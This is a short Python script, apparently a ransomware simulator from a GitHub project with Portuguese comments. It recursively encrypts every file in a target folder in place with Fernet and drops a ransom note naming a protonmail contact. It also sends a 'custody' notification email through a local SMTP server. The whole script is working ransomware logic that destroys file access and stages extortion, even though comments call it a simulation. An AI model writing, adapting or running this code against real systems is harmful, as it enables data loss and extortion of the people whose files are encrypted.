import os
from cryptography.fernet import Fernet
import smtplib
from email.mime.text import MIMEText

# Geração e salvamento da chave de criptografia
def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)
    return chave

# Criptografar todos os arquivos em uma pasta
def criptografar_arquivos(pasta, fernet):
    for root, dirs, files in os.walk(pasta):
        for file in files:
            caminho = os.path.join(root, file)
            try:
                with open(caminho, "rb") as original_file:
                    dados = original_file.read()
                dados_encriptados = fernet.encrypt(dados)
                with open(caminho, "wb") as encriptado_file:
                    encriptado_file.write(dados_encriptados)
                print(f"Arquivo criptografado: {caminho}")
            except Exception as e:
                print(f"Erro ao criptografar {caminho}: {e}")

# Gerar bilhete de resgate
def criar_ransom_note(pasta_destino):
    mensagem = """
    Seus arquivos foram criptografados.
    Para recuperar seus dados, entre em contato com: teste.ransom@protonmail.com
    Não tente remover a criptografia, você pode perder tudo.
    """
    with open(os.path.join(pasta_destino, "LEIA_ISSO.txt"), "w") as arquivo:
        arquivo.write(mensagem)

# Enviar email simulado (Mailtrap ou SMTP local)
def enviar_email_simulado(destinatario):
    msg = MIMEText("Disco criptografado com sucesso. Custódia ativa.")
    msg['Subject'] = 'Notificação de Ação'
    msg['From'] = 'simulador@teste.local' # se estiver vendo no githib, favor alterar para simulação funcionar
    msg['To'] = destinatario

    try:
        with smtplib.SMTP('localhost') as server:  # Use Mailtrap ou servidor SMTP local
            server.send_message(msg)
        print("Email de custódia enviado.")
    except Exception as e:
        print(f"Erro ao enviar email: {e}")

# Execução
if __name__ == "__main__":
    pasta_alvo = "/home/teste/documents"
    chave = gerar_chave()
    fernet = Fernet(chave)

    criptografar_arquivos(pasta_alvo, fernet)
    criar_ransom_note(pasta_alvo)
    enviar_email_simulado("email@teste.local") # se estiver vendo no githib, favor alterar para simulação funcionar
